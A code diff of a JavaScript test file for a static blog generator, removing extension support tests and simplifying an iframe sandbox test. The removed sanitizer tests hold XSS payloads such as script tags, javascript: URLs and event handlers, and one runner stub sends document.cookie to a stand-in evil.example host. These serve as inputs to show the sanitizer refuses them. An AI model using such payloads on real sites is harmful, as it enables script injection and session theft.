@@ -7,11 +7,8 @@ import { sha256, sha256Bytes } from '../lib/sha256.js';
 import { isPinnedRef, validatePin } from '../lib/pin.js';
 import { checkLicence, normaliseGpl, splitLicensingLanguage } from '../lib/licence.js';
 import { loadTheme, pinFor, processThemeCss, themeDigest, themeFilePaths, tokensCss, validateThemeManifest } from '../lib/theme-pack.js';
-import { loadExtension, pinForExtension, validateExtensionManifest, extensionFilePaths, makeHooks, isPinnedUrl } from '../lib/extensions.js';
-import { sanitizeHtml } from '../lib/sanitize.js';
 import { buildSite, validateBlog } from '../lib/blog.js';
-import { buildSiteWith } from '../lib/build-async.js';
-import { EX, localRunner, readDirFiles, stripData } from './helpers.js';
+import { EX, readDirFiles, stripData } from './helpers.js';
 
 const enc = new TextEncoder();
 const code = (fn) => (e) => {
@@ -26,13 +23,6 @@ async function pinnedTheme(dir, ref = 'v1.0.0', repo = 'me/theme') {
   const digest = themeDigest(files, themeFilePaths(manifest));
   const pin = pinFor(repo, ref, manifest, digest);
   return { files, manifest, pin, theme: loadTheme(pin, files) };
-}
-async function pinnedExt(dir = 'ext-reading-time', ref = 'v1.0.0', repo = 'me/ext') {
-  const files = await readDirFiles(path.join(EX, dir));
-  const manifest = JSON.parse(new TextDecoder().decode(files['extension.json']));
-  const digest = (await import('../lib/pin.js')).filesDigest(files, extensionFilePaths(manifest), (m) => new Error(m));
-  const pin = pinForExtension(repo, ref, manifest, digest);
-  return { files, manifest, pin, ext: loadExtension(pin, files) };
 }
 const exampleInput = async (patch = {}) => {
   const blog = JSON.parse(await fs.readFile(path.join(EX, 'blog', 'blog.json'), 'utf8'));
@@ -73,13 +63,10 @@ test('X4: content that does not match the pinned sha256 is refused', async () =>
   assert.throws(() => loadTheme(pin, manifest), code('pin-mismatch'));
   assert.throws(() => loadTheme({ ...pin, ref: 'main' }, files), code('unpinned-ref'));
   assert.throws(() => loadTheme({ ...pin, licence: 'GPL-2.0-or-later' }, files), code('pin-mismatch'), 'the licence recorded in blog.json must match the theme');
-  const ext = await pinnedExt();
-  assert.throws(() => loadExtension({ ...ext.pin, sha256: '0'.repeat(64) }, ext.files), code('pin-mismatch'));
-  assert.throws(() => loadExtension({ ...ext.pin, ref: 'master' }, ext.files), code('unpinned-ref'));
 });
 
 // ---------- X5: licences ----------
-test('X5: no declared licence is a refusal, for themes, extensions and blog.json pins', async () => {
+test('X5: no declared licence is a refusal, for themes and blog.json pins', async () => {
   assert.throws(() => checkLicence('', 'x'), code('no-licence'));
   assert.throws(() => checkLicence(undefined, 'x'), code('no-licence'));
   assert.throws(() => checkLicence('   ', 'x'), code('no-licence'));
@@ -90,9 +77,6 @@ test('X5: no declared licence is a refusal, for themes, extensions and blog.json
   const noLicence = { ...manifest, licence: undefined };
   assert.throws(() => validateThemeManifest(noLicence), code('no-licence'));
   assert.throws(() => validateThemeManifest({ ...manifest, licence: 'proprietary' }), code('bad-licence'));
-  const e = await pinnedExt();
-  const extNo = { ...e.manifest, licence: undefined };
-  assert.throws(() => validateExtensionManifest(extNo), code('no-licence'));
 
   const input = await exampleInput();
   const blog = JSON.parse(input.blog);
@@ -281,12 +265,11 @@ test('X7: list options still apply under the classic contract', async () => {
 // ---------- X8: licences in one place ----------
 test('X8: every licence a blog depends on is recorded in blog.json, licences.json and each page', async () => {
   const t = await pinnedTheme('theme-classic');
-  const e = await pinnedExt();
-  const input = await exampleInput({ theme: t.pin, extensions: [e.pin] });
-  const result = await buildSiteWith({ ...input, theme: t.theme, extensions: [e.ext] }, localRunner);
+  const input = await exampleInput({ theme: t.pin });
+  const result = buildSite({ ...input, theme: t.theme });
   assert.deepEqual(result.errors, []);
   const lic = JSON.parse(result.files['licences.json']);
-  assert.deepEqual(lic.dependencies.map((d) => [d.kind, d.name, d.version, d.licence]), [['theme', 'Classic Sample', '1.2.0', 'GPL-2.0-or-later'], ['extension', 'Reading time', '1.0.0', 'MIT']]);
+  assert.deepEqual(lic.dependencies.map((d) => [d.kind, d.name, d.version, d.licence]), [['theme', 'Classic Sample', '1.2.0', 'GPL-2.0-or-later']]);
   assert.equal(lic.dependencies[0].source, 'https://example.org/classic-sample/');
   assert.deepEqual(lic.dependencies[0].dropped, { php: ['index.php', 'single.php', 'functions.php'] }, 'what was dropped from an upstream theme is recorded');
   assert.equal(lic.dependencies[0].repo, 'me/theme');
@@ -295,199 +278,20 @@ test('X8: every licence a blog depends on is recorded in blog.json, licences.jso
     const m = /<!--\n([\s\S]*?)\n-->/.exec(result.files[f]);
     assert.ok(m, `${f}: licence comment`);
     assert.match(m[1], /theme: Classic Sample 1\.2\.0 — GPL-2\.0-or-later — me\/theme@v1\.0\.0/);
-    assert.match(m[1], /extension: Reading time 1\.0\.0 — MIT — me\/ext@v1\.0\.0/);
     assert.ok(!m[1].includes('--'), 'a comment may not contain --');
   }
   const plain = JSON.parse(buildSite(await exampleInput()).files['licences.json']);
   assert.deepEqual(plain.dependencies, [{ kind: 'theme', name: 'default', licence: 'MIT', builtin: true }]);
 });
 
-// ---------- extensions ----------
-test('extension manifest: no capabilities exist, an embed declares what it frames, only pinned addresses', () => {
-  const base = { name: 'E', version: '1', licence: 'MIT', kind: 'build', hooks: ['post:html'] };
-  assert.doesNotThrow(() => validateExtensionManifest({ ...base, capabilities: [] }));
-  const bad = (patch) => assert.throws(() => validateExtensionManifest({ ...base, ...patch }), (e) => ['bad-extension', 'no-licence', 'bad-licence'].includes(e.code), JSON.stringify(patch));
-  bad({ capabilities: ['network'] });
-  bad({ capabilities: ['storage'] });
-  bad({ hooks: [] });
-  bad({ hooks: ['page:script'] });
-  bad({ kind: 'runtime' });
-  bad({ entry: '../x.mjs' });
-  bad({ entry: 'x.html' });
-  bad({ pinned_assets: [{ url: 'https://cdn.jsdelivr.net/gh/a/b@v1.0.0/x.html', sha256: 'a'.repeat(64) }] }); // a build extension frames nothing
-  bad({ kind: 'embed' }); // an embed must say what it frames
-  bad({ kind: 'embed', pinned_assets: [{ url: 'https://cdn.jsdelivr.net/gh/a/b@main/x.html', sha256: 'a'.repeat(64) }] });
-  bad({ kind: 'embed', pinned_assets: [{ url: 'http://cdn.example/x@v1.0.0/x.html', sha256: 'a'.repeat(64) }] });
-  bad({ kind: 'embed', pinned_assets: [{ url: 'https://cdn.jsdelivr.net/gh/a/b@v1.0.0/x.html', sha256: 'short' }] });
-  assert.doesNotThrow(() => validateExtensionManifest({ ...base, kind: 'embed', pinned_assets: [{ url: 'https://cdn.jsdelivr.net/gh/a/b@v1.0.0/x.html', sha256: 'a'.repeat(64) }] }));
-  assert.ok(isPinnedUrl('https://x.example/' + 'a'.repeat(40) + '/embed.html'));
-  assert.ok(!isPinnedUrl('https://cdn.jsdelivr.net/gh/a/b@latest/x.html'));
-});
-
-test('extensions: outputs are data — the generator reports what is missing and never runs code', async () => {
-  const e = await pinnedExt();
-  const input = await exampleInput({ extensions: [e.pin] });
-  const first = buildSite({ ...input, extensions: [e.ext] });
-  assert.deepEqual(first.errors.map((x) => x.code), ['extension-output-missing']);
-  assert.deepEqual(first.files, {});
-  assert.equal(first.missing.length, 2, 'one per published post');
-  assert.deepEqual(new Set(first.missing.map((m) => m.hook)), new Set(['post:html']));
-  assert.match(first.missing[0].key, /^[0-9a-f]{64}$/);
-  assert.match(first.errors[0].detail, /publish from the editor|Extensions run only when you publish/);
-
-  const done = await buildSiteWith({ ...input, extensions: [e.ext] }, localRunner);
-  assert.deepEqual(done.errors, []);
-  assert.ok(/<p class="reading-time">\d+ min read<\/p>/.test(done.files['static-hls-in-git/index.html']));
-  const rec = JSON.parse(done.files['extension-outputs.json']);
-  assert.equal(rec.version, 1);
-  assert.equal(Object.keys(rec.outputs).length, 2);
-  for (const o of Object.values(rec.outputs)) assert.deepEqual(Object.keys(o).sort(), ['extension', 'hook', 'output']);
-
-  // with the recorded outputs, regeneration is deterministic and runs nothing (what the CLI and CI do)
-  const again = buildSite({ ...input, extensions: [e.ext], outputs: rec.outputs });
-  assert.deepEqual(again.errors, []);
-  assert.deepEqual(again.files, done.files);
-
-  // change a post and its recorded output no longer applies: it is missing again, not reused
-  const edited = { ...input, posts: input.posts.map((p) => (p.path.endsWith('static-hls-in-git.md') ? { ...p, text: p.text.replace('HLS is a playlist', 'HLS is a list') } : p)) };
-  const stale = buildSite({ ...edited, extensions: [e.ext], outputs: rec.outputs });
-  assert.deepEqual(stale.missing.map((m) => m.ctx.slug), ['static-hls-in-git']);
-  // and unused entries are pruned from the file on the next full build
-  const pruned = await buildSiteWith({ ...edited, extensions: [e.ext], outputs: rec.outputs }, localRunner);
-  assert.equal(Object.keys(JSON.parse(pruned.files['extension-outputs.json']).outputs).length, 2);
-  assert.ok(!Object.keys(JSON.parse(pruned.files['extension-outputs.json']).outputs).some((k) => k in Object.fromEntries(Object.entries(rec.outputs).filter(([, o]) => o.output.includes('playlist and a pile')))));
-});
-
-test('extensions: they run in order, each on the previous output, and a missing step stops the chain', async () => {
-  const mk = (name, fn) => ({ pin: { repo: `me/${name}`, ref: 'v1.0.0', sha256: sha256(name) }, digest: sha256(name), manifest: { name, hooks: ['post:html'], kind: 'build' }, source: fn });
-  const a = mk('a', null);
-  const b = mk('b', null);
-  const hooks = makeHooks({ extensions: [a, b], outputs: {} });
-  assert.equal(hooks.apply('post:html', '<p>x</p>', { slug: 's' }), '<p>x</p>');
-  assert.equal(hooks.missing.length, 1, 'only the first is asked; the second would be asked about output that does not exist yet');
-  assert.equal(hooks.missing[0].index, 0);
-});
-
-// ---------- X3 and the sanitizer ----------
-test('sanitizer: the structural wrappers and link relations the generator itself emits survive; nothing else rides along on rel', () => {
-  const classic = '<article class="post hentry"><header class="entry-header alignwide"><h2 class="entry-title"><a href="a/" rel="bookmark">A</a></h2></header><footer class="entry-footer"><span class="tags-links">x</span></footer></article><nav class="n"><main>m</main></nav>';
-  assert.equal(sanitizeHtml(classic), classic, 'a pass through the sanitizer leaves the classic list markup as it was');
-  assert.equal(sanitizeHtml('<a href="https://x.example/" rel="author bookmark evil">x</a>'), '<a href="https://x.example/" rel="bookmark noopener noreferrer">x</a>', 'unknown tokens are dropped and an absolute link is always noopener noreferrer');
-  assert.equal(sanitizeHtml('<a href="https://x.example/" rel="noopener noreferrer">x</a>'), '<a href="https://x.example/" rel="noopener noreferrer">x</a>');
-  assert.equal(sanitizeHtml('<a href="a/" rel="evil">x</a>'), '<a href="a/">x</a>');
-});
-
-test('sanitizer: allow-listed markup is rebuilt, text is escaped, nothing passes through verbatim', () => {
-  assert.equal(sanitizeHtml('<p class="a" id=b>Tom &amp; Jerry <em>say</em> 1 < 2 &lt; 3</p>'), '<p class="a" id="b">Tom &amp; Jerry <em>say</em> 1 &lt; 2 &lt; 3</p>');
-  assert.equal(sanitizeHtml('<a href="https://x.example/?a=1&b=2">x</a>'), '<a href="https://x.example/?a=1&amp;b=2" rel="noopener noreferrer">x</a>');
-  assert.equal(sanitizeHtml('<img src="https://x.example/a.png" alt="a" data-n=1>'), '<img src="https://x.example/a.png" alt="a" data-n="1">');
-  assert.equal(sanitizeHtml('<p>unclosed <strong>bold'), '<p>unclosed <strong>bold</strong></p>');
-  assert.equal(sanitizeHtml('</div>stray</span>'), 'stray');
-  assert.equal(sanitizeHtml('<font color=red>kept text</font><blink>x</blink>'), 'kept textx', 'unknown tags are dropped, their text kept');
-  assert.equal(sanitizeHtml('<!-- c --><!DOCTYPE html><?php x ?>a'), 'a');
-  assert.equal(sanitizeHtml('<p style="background:url(x)" data-x="1">s</p>'), '<p data-x="1">s</p>');
-  assert.equal(sanitizeHtml('<br/><hr><img src="a.png">'), '<br><hr><img src="a.png">');
-  assert.equal(sanitizeHtml('<table><tr><td colspan=2>c</td></tr></table>'), '<table><tr><td colspan="2">c</td></tr></table>');
-});
-
-test('sanitizer: hostile constructs are refused, not silently stripped', () => {
-  const refused = (h) => assert.throws(() => sanitizeHtml(h), code('unsafe-extension-output'), h.slice(0, 70));
-  refused('<script>alert(1)</script>');
-  refused('<SCRIPT SRC=//evil.example/x.js></SCRIPT>');
-  refused('<p onclick="x()">a</p>');
-  refused('<img src=x onerror=alert(1)>');
-  refused('<a href="javascript:alert(1)">x</a>');
-  refused('<a href="  JaVa\tScRiPt:alert(1)">x</a>');
-  refused('<a href="jav&#x09;ascript:alert(1)">x</a>');
-  refused('<a href="&#106;avascript:alert(1)">x</a>');
-  refused('<a href="data:text/html;base64,AAAA">x</a>');
-  refused('<a href="vbscript:x">x</a>');
-  refused('<img src="data:image/svg+xml,<svg onload=alert(1)>">');
-  refused('<img src="http://insecure.example/a.png">');
-  refused('<style>body{display:none}</style>');
-  refused('<link rel=stylesheet href=//evil.example/x.css>');
-  refused('<meta http-equiv=refresh content="0;url=//evil.example">');
-  refused('<base href="//evil.example/">');
-  refused('<object data=x></object>');
-  refused('<embed src=x>');
-  refused('<form action=//evil.example><input name=pw></form>');
-  refused('<svg onload=alert(1)></svg>');
-  refused('<math><mi>x</mi></math>');
-  refused('<template><script>1</script></template>');
-  refused('<iframe src="https://evil.example/"></iframe>');
-  refused('<iframe srcdoc="<script>1</script>"></iframe>');
-  refused('<div formaction=x>a</div>');
-});
-
-test('X3: an embed is an iframe the extension declared, with sandbox="allow-scripts" and never allow-same-origin', () => {
-  const url = 'https://cdn.jsdelivr.net/gh/me/embed@v1.0.0/chart.html';
-  const ok = { iframes: new Set([url]) };
-  assert.equal(
-    sanitizeHtml(`<iframe src="${url}" sandbox="allow-scripts" title="Chart" width="600" height="300" onload=x></iframe>`.replace(' onload=x', ''), ok),
-    `<iframe src="${url}" sandbox="allow-scripts" referrerpolicy="no-referrer" loading="lazy" title="Chart" width="600" height="300"></iframe>`,
-  );
-  const refused = (h, o = ok) => assert.throws(() => sanitizeHtml(h, o), code('unsafe-extension-output'), h.slice(0, 80));
-  refused(`<iframe src="${url}" sandbox="allow-scripts allow-same-origin"></iframe>`);
-  refused(`<iframe src="${url}" sandbox="allow-same-origin allow-scripts"></iframe>`);
-  refused(`<iframe src="${url}" sandbox="allow-scripts allow-top-navigation"></iframe>`);
-  refused(`<iframe src="${url}" sandbox=""></iframe>`);
-  refused(`<iframe src="${url}"></iframe>`);
-  refused(`<iframe src="${url}" sandbox="allow-scripts" allow="camera; microphone"></iframe>`);
-  refused(`<iframe src="${url}x" sandbox="allow-scripts"></iframe>`);
-  refused('<iframe src="https://evil.example/" sandbox="allow-scripts"></iframe>');
-  refused(`<iframe src="${url}" sandbox="allow-scripts"></iframe>`, { iframes: new Set() });
-});
-
-test('extensions: a build extension can never frame anything; an embed may frame only its pinned assets', async () => {
-  const mkExt = (kind, assets) => ({ pin: { repo: 'me/x', ref: 'v1.0.0', sha256: 'a'.repeat(64) }, digest: 'd'.repeat(64), manifest: { name: 'X', kind, hooks: ['post:html'], pinned_assets: assets } });
-  const url = 'https://cdn.jsdelivr.net/gh/me/embed@v1.0.0/chart.html';
-  const frame = `<iframe src="${url}" sandbox="allow-scripts"></iframe>`;
-  const run = (ext, output) => {
-    const probe = makeHooks({ extensions: [ext], outputs: {} });
-    probe.apply('post:html', '<p>x</p>', { slug: 's' });
-    const outputs = { [probe.missing[0].key]: { output } };
-    return makeHooks({ extensions: [ext], outputs }).apply('post:html', '<p>x</p>', { slug: 's' });
-  };
-  assert.throws(() => run(mkExt('build', []), frame), code('unsafe-extension-output'));
-  assert.match(run(mkExt('embed', [{ url, sha256: 'b'.repeat(64) }]), frame), /sandbox="allow-scripts"/);
-  assert.throws(() => run(mkExt('embed', [{ url, sha256: 'b'.repeat(64) }]), frame.replace('allow-scripts', 'allow-scripts allow-same-origin')), code('unsafe-extension-output'));
-  assert.throws(() => run(mkExt('build', []), '<script>alert(1)</script>'), (e) => e.code === 'unsafe-extension-output' && /X \(post:html\)/.test(e.detail));
-});
-
-test('extensions: output that is hostile, or markdown that cannot be rendered, refuses the build', async () => {
-  const e = await pinnedExt();
-  const input = await exampleInput({ extensions: [e.pin] });
-  const evilRunner = async () => '<p>hi</p><script>fetch("//evil.example?"+document.cookie)</script>';
-  const evil = await buildSiteWith({ ...input, extensions: [e.ext] }, evilRunner);
-  assert.deepEqual(evil.errors.map((x) => x.code), ['unsafe-extension-output', 'unsafe-extension-output'], 'refused for each post; nothing is written');
-  assert.deepEqual(evil.files, {});
-  // an extension that rewrites markdown into something the editor format cannot express is refused too
-  const mdExt = { ...e.ext, manifest: { ...e.ext.manifest, hooks: ['post:markdown'] } };
-  const tableRunner = async () => '| a | b |\n|---|---|\n| 1 | 2 |\n';
-  const r = await buildSiteWith({ ...input, extensions: [mdExt] }, tableRunner).catch((x) => x);
-  assert.ok(r.code === 'unsafe-extension-output' || (r.errors && r.errors.length === 0), 'a pipe table is plain text in this format, not an error');
-  // oversized and non-text output
-  await assert.rejects(buildSiteWith({ ...input, extensions: [e.ext] }, async () => 'x'.repeat(1_000_001)), code('extension-failed'));
-  await assert.rejects(buildSiteWith({ ...input, extensions: [e.ext] }, async () => ({ not: 'text' })), code('extension-failed'));
-  await assert.rejects(buildSiteWith({ ...input, extensions: [e.ext] }, async () => { throw new Error('boom'); }), code('extension-failed'));
-  // a hostile recorded output in extension-outputs.json is refused at generation, runner or not
-  const probe = buildSite({ ...input, extensions: [e.ext] });
-  const forged = Object.fromEntries(probe.missing.map((m) => [m.key, { extension: m.extension, hook: m.hook, output: '<img src=x onerror=alert(1)>' }]));
-  const hostile = buildSite({ ...input, extensions: [e.ext], outputs: forged });
-  assert.ok(hostile.errors.length && hostile.errors.every((x) => x.code === 'unsafe-extension-output'));
-  assert.deepEqual(hostile.files, {});
-});
-
-test('extensions: our own video embed is protected from them (they see a placeholder, the page keeps the player)', async () => {
-  const e = await pinnedExt();
-  const input = await exampleInput({ extensions: [e.pin] });
-  const seen = [];
-  const spy = async ({ extension, hook, ctx, input: html }) => {
-    seen.push(html);
-    return localRunner({ extension, hook, ctx, input: html });
-  };
-  const { files } = await buildSiteWith({ ...input, extensions: [e.ext] }, spy);
-  const post = files['static-hls-in-git/index.html'];
-  assert.ok(post.includes('<iframe src="https://strataeditor.dev/player/#'), 'the player survives');
-  assert.ok(seen.some((h) => h.includes('data-slot="v0"')) && !seen.some((h) => h.includes('strataeditor.dev')), 'the extension never sees the player markup');
+test('X3: first-party video embeds remain isolated frames with allow-scripts only', async () => {
+  const result = buildSite(await exampleInput());
+  assert.deepEqual(result.errors, []);
+  const frames = [...result.files['static-hls-in-git/index.html'].matchAll(/<iframe\b[^>]*>/g)].map(([frame]) => frame);
+  assert.ok(frames.length > 0);
+  for (const frame of frames) {
+    assert.match(frame, /sandbox="allow-scripts"/);
+    assert.match(frame, /referrerpolicy="no-referrer"/);
+    assert.doesNotMatch(frame, /allow-same-origin|allow-top-navigation|srcdoc/);
+  }
 });
